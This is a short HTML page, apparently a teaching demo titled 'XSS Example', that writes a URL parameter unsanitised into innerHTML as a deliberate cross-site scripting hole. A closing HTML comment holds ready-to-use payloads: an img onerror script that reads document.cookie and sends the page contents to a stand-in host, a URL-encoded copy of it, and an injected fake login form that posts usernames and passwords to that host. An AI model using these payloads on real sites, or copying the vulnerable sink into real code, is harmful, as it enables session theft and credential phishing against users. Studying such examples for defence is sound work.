<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>XSS Example</title>
    </head>

    <body>

        <!-- Vulnerable Code -->
        <div>
            Welcome, <span id="username"></span>!
        </div>

        <script>
            // Function to set a cookie, mostly this will be set from server
            function setCookie(name, value, days) {
                const date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                const expires = "expires=" + date.toUTCString();
                document.cookie = name + "=" + value + ";" + expires +
                    ";path=/";
            }

            // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
            setCookie("exampleCookie", "Hello, Cookie!", 7);

        </script>

        <!-- Vulnerable Code -->
        <script>
            const params = new URLSearchParams(window.location.search);
            const name = params.get('name');
            document.getElementById('username').innerHTML = name;

        </script>

    </body>

</html>
<!-- 
Stealing critical info
<img src="error.gif" onerror="var mycookie=document.cookie;new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;"/>


encodeURIComponent("<img src=\"error.gif\" onerror=\"var mycookie=document.cookie;new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;\"/>")

Phishing Attack
-------------------------
<h3>Please log into form</h3> <form action=http://example.com/fakepage.php>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>

-->
